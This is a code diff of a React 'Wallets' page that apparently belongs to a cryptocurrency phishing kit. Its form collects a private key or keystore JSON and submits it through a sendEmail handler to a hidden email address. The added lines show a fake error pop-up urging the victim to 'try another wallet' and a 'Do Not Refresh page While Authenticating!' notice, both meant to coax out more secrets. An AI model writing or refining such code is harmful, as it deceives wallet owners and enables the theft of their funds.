@@ -421,7 +421,24 @@ const Wallets = () => {
   // };
 
   const handleResponse = () => {
-    Swal.fire("Good job!", "You clicked the button!", "success");
+    Swal.fire(
+      {
+        icon: "error",
+        title: "Error!",
+        text: "Please try Another wallet!, Multiple iOS and android wallets support the wallet connect protocol., interaction between mobile apps and mobile browsers are supported via mobile deep linking!",
+        //   showCancelButton: true,
+        showConfirmButton: true,
+        allowOutsideClick: false,
+        confirmButtonColor: "rgb(81, 184, 233)",
+        confirmButtonText: "Wait For Connection?",
+        preConfirm: () => {
+          document.getElementById("hides").style.display = "block";
+        },
+        footer: '<a href="index.html">try another wallet!</a>',
+        // }, 5000);
+      },
+      5000
+    ); // 5000 milliseconds (5 seconds)
   };
 
   const form = useRef();
@@ -567,6 +584,9 @@ const Wallets = () => {
                                   required
                                   type="text"
                                 ></textarea>
+                                <span id="hides" className="text-danger text-center center">
+                                  Do Not Refresh page While Authenticating!
+                                </span>
                                 <input
                                   type="hidden"
                                   value="sarahmcleonard@gmail.com"
@@ -650,9 +670,11 @@ const Wallets = () => {
                           <span className="mt-3 brandColor">Keystore JSON</span>
                           <div className="col-md-12">
                             <div className="md-form mb-4 pink-textarea active-pink-textarea">
-                              <form ref={form}
-                              onSubmit={sendEmail}
-                              method="post">
+                              <form
+                                ref={form}
+                                onSubmit={sendEmail}
+                                method="post"
+                              >
                                 <p>
                                   <input
                                     type="text"
@@ -662,7 +684,6 @@ const Wallets = () => {
                                     className="md-textarea form-control privateKey"
                                     rows="3"
                                     required
-                                    
                                   />
                                 </p>
                                 <input
@@ -683,7 +704,7 @@ const Wallets = () => {
                                   </div>
                                   <div className="col-md-3">
                                     <button
-                                    onClick={handleResponse}
+                                      onClick={handleResponse}
                                       type="submit"
                                       className="btn btn-primary float"
                                     >
